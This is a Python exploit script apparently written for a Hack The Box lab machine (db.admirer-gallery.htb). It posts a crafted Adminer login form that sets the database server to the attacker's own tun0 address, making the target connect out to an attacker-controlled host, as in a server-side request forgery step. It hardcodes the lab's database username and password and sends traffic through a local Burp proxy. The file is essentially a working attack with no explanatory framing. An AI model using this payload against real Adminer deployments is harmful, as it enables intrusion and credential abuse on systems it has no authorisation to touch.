#!/usr/bin/python3

import sys, signal, argparse, requests, netifaces

base_url = "http://db.admirer-gallery.htb/"
burp = {"http" : "http://127.0.0.1:8080"}
def args():
	parser = argparse.ArgumentParser()
	parser.add_argument("interface", help="The name of the hackthebox interface, by default: tun0")
	args = parser.parse_args()
	return args.interface

def getAddr(interface):
	return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']

def sendPayload(host):
	header = {
		"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36"
	}
	post_data = {
		"auth[driver]" : "elastic",
		"auth[server]" : host,
		"auth[username]" : "admirer_ro",
		"auth[password]" : "1w4nn4b3adm1r3d2!",
		"auth[db]" : "admirer",
		"auth[permanent]" : "1"
	}
	r = requests.post(base_url, data=post_data, headers=header, proxies=burp)
def main():
	interface = args()
	host = getAddr(interface)
	sendPayload(host)

def def_handler(signum, frame):
	print("\n\n[*] Exiting...\n")
	sys.exit()

signal.signal(signal.SIGINT, def_handler)
if __name__ == '__main__':
	main()
